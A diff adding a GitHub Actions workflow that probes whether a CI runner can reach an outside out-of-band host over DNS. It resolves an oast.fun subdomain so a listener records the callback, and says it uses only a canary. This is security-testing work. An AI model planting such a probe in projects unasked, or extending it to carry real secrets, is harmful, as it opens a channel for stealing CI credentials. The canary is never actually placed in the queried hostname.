@@ -1,0 +1,25 @@
+# Fork-only test: proves DNS channel exists on YOUR fork runner.
+# Safe: uses canary only, no real secrets. Do NOT add to upstream repo.
+name: DNS egress channel test (fork only)
+on: {workflow_dispatch: {}}
+jobs:
+  dns-test:
+    runs-on: ubuntu-latest
+    permissions: {contents: read}
+    steps:
+      - name: DNS exfil probe (canary, python - no apt needed)
+        run: |
+          CANARY="x4hd2k9pq-$GITHUB_RUN_ID"
+          HOST="mwwevupsrzcerthccpzlaylgvatxj1w93.oast.fun"
+          echo "Resolving $HOST ..."
+          python3 -c "import socket; print(socket.gethostbyname('$HOST'))" || true
+          python3 -c "
+          import socket
+          h='$HOST'
+          print('querying', h)
+          try:
+              print(socket.getaddrinfo(h, 80))
+          except Exception as e:
+              print('query left runner, got:', type(e).__name__, e)
+          "
+          echo "Done. Check your OOB listener for DNS callback with $CANARY"
